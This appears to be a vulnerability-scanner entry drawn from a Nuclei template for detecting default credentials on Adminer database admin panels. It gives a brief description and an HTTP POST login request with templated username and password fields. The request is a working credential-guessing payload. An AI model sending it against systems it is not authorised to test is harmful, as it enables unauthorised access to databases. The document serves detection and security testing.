# Vulnerability: Adminer Default Login - Detect
**Classification:** CWE-522
**Source:** Nuclei Template (`adminer-default-login.yaml`)

## Description
Adminer contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

auth[driver]=server&auth[server]=&auth[username]={{username}}&auth[password]={{password}}&auth[db]=
```

